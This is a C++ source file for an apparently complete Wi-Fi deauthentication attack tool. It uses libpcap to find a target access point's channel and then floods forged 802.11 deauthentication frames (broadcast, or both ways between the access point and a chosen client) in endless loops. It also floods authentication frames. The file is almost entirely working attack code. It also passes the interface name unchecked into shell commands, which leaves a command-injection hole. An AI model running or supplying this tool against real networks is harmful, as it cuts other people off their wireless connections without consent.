#include "deauth-attack.hpp"

BOOL BeaconFrame::IsBeacon()
{
    if (Subtype == 8 && Type == 0)
        return true;
    return false;
}

mac::mac()
{
    for (int i = 0; i < 6; i++)
    {
        this->address[i] = 0xff;
    }
}

mac::mac(const BYTE *MAC_Array)
{
    memcpy(this->address, MAC_Array, 6);
}

mac::mac(const char *MAC_String)
{
    unsigned int imac[6];
    sscanf(MAC_String, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &this->address[0], &this->address[1], &this->address[2], &this->address[3], &this->address[4], &this->address[5]);
}

BYTE *mac::toByteArray()
{
    return this->address;
}

std::string mac::toString()
{
    char mac[18] = { 0, };
    
    sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", this->address[0], this->address[1], this->address[2], this->address[3], this->address[4], this->address[5]);

    return std::string(mac);
}

DeauthAttack::DeauthAttack(char *dev)
{
    this->dev = dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    this->pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (this->pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        exit(-1);
    }

    this->GetChannels();
}

void DeauthAttack::GetChannels()
{
    char command[32];
    char line[32];
    std::regex re(" {1}([0-9]+) ");
    std::smatch match;
    sprintf(command, "iwlist %s channel", this->dev);
    FILE *fp = popen(command, "r");
    fgets(line, 32, fp);

    while (fgets(line, 32, fp) != NULL)
    {
        std::string data = line;
        if (std::regex_search(data, match, re))
            this->Channels.push_back(std::stoi(match.str()));
    }
    
    fclose(fp);
}

bool DeauthAttack::SetBSSID(mac BSSID)
{
    this->BSSID = BSSID;
    return true;
}

bool DeauthAttack::SetSTATION(mac STATION)
{
    this->STATION = STATION;
    return true;
}

void DeauthAttack::SearchBeacon(int channel)
{
    time_t t = time(NULL) + 2;
    this->SetChannel(channel);
    std::cout << "Search BSSID " << this->BSSID.toString() << " BeaconFrame in channel " << std::dec << channel << std::endl;
    while (true)
    {
        if (t < time(NULL))
            break;
        struct pcap_pkthdr *header;
        const unsigned char *packet;
        int res = pcap_next_ex(this->pcap, &header, &packet);
        if (res == 0)
        {
            // std::cout << "res is zero" << std::endl;
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        IEEE_80211 *IEEE_80211 = (struct _IEEE_80211 *)packet;

        if (IEEE_80211->Beacon.IsBeacon() == false)
        {
            // std::cout << "This packet is not beacon" << std::endl;
            continue;
        }

        if (memcmp(IEEE_80211->Beacon.SourceMac, this->BSSID.toByteArray(), 6) == 0)
        {    
            this->channel = channel;
            break;
        }
    }
}

void DeauthAttack::SetChannel(int channel)
{
    char command[40];
    sprintf(command, "iwconfig %s channel %d", this->dev, channel);
    system(command);
}

void DeauthAttack::SearchChannel()
{
    pthread_t ThreadId;
    for (int i = 0; i < this->Channels.size(); i++)
    {
        this->SearchBeacon(this->Channels[i]);
        if (this->channel != 0)
            break;
    }
}

bool DeauthAttack::SendDeauthPacket(BYTE *BSSID)
{
    return this->SendDeauthPacket(BSSID, (BYTE *)"\xff\xff\xff\xff\xff\xff");
}

bool DeauthAttack::SendDeauthPacket(BYTE *src, BYTE *dst)
{
    BYTE DeauthUnicastPacket[] = { 0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00, 0xc0, 0x00, 0x3a, 0x01, 0x94, 0x8b, 0xc1, 0xc5, 0xec, 0xb6, 0xaa, 0x2b, 0xb9, 0x59, 0x77, 0x72, 0xaa, 0x2b, 0xb9, 0x59, 0x77, 0x72, 0x00, 0x00, 0x07, 0x00 };
    memcpy(DeauthUnicastPacket + 15, dst, 6);
    memcpy(DeauthUnicastPacket + 21, src, 6);

    return pcap_sendpacket(this->pcap, DeauthUnicastPacket, 37) == 0 ? true : false;
}

void DeauthAttack::SendDeauthPacket(bool Broadcast)
{
    this->SearchChannel();

    if (this->channel == 0)
    {
        std::cout << "BSSID " << this->BSSID.toString() << " BeaconFrame Not Found!" << std::endl;
        return;
    }

    this->SetChannel(this->channel);

    while (true)
    {
        if (Broadcast)
        {
            time_t t = time(NULL);
            struct tm *timeinfo = localtime(&t);
            if (this->SendDeauthPacket(this->BSSID.toByteArray()))
            {
                printf("%02d:%02d:%02d", timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
                std::cout << " Send deauth packet src " << this->BSSID.toString() << " to dst Broadcast" << std::endl;
            }
            usleep(100000);
        }
        else
        {
            time_t t = time(NULL);
            struct tm *timeinfo = localtime(&t);
            if (this->SendDeauthPacket(this->BSSID.toByteArray(), this->STATION.toByteArray()))
            {
                printf("%02d:%02d:%02d", timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
                std::cout << " Send deauth packet src " << this->BSSID.toString() << " to dst " << this->STATION.toString() << std::endl;
            }
            usleep(100000);
            t = time(NULL);
            timeinfo = localtime(&t);
            if (this->SendDeauthPacket(this->STATION.toByteArray(), this->BSSID.toByteArray()))
            {
                printf("%02d:%02d:%02d", timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
                std::cout << " Send deauth packet src " << this->STATION.toString() << " to dst " << this->BSSID.toString() << std::endl;
            }
            usleep(100000);
        }
    }
}

void DeauthAttack::SendAuthPacket()
{
    BYTE AuthPacket[] = { 0x00, 0x00, 0x18, 0x00, 0x2e, 0x40, 0x00, 0xa0, 0x20, 0x08, 0x00, 0x00, 0x00, 0x02, 0x8f, 0x09, 0xa0, 0x00, 0xe1, 0x00, 0x00, 0x00, 0xe1, 0x00, 0xb0, 0x00, 0x3a, 0x01, 0x88, 0x3c, 0x1c, 0x98, 0xe4, 0x88, 0xa8, 0x2b, 0xb9, 0x59, 0x77, 0x72, 0x88, 0x3c, 0x1c, 0x98, 0xe4, 0x88, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xdd, 0x09, 0x00, 0x10, 0x18, 0x02, 0x00, 0x00, 0x10, 0x00, 0x00 };
    memcpy(AuthPacket + 28, this->BSSID.toByteArray(), 6);
    memcpy(AuthPacket + 34, this->STATION.toByteArray(), 6);

    this->SearchChannel();

    if (this->channel == 0)
    {
        std::cout << "BSSID " << this->BSSID.toString() << " BeaconFrame Not Found!" << std::endl;
        return;
    }

    this->SetChannel(this->channel);

    while (true)
    {
        if (pcap_sendpacket(this->pcap, AuthPacket, 65) == 0)
        {
            time_t t = time(NULL);
            struct tm *timeinfo = localtime(&t);
            printf("%02d:%02d:%02d", timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
            std::cout << " Send auth packet src " << this->STATION.toString() << " to dst " << this->BSSID.toString() << std::endl;
        }
        usleep(100000);
    }
}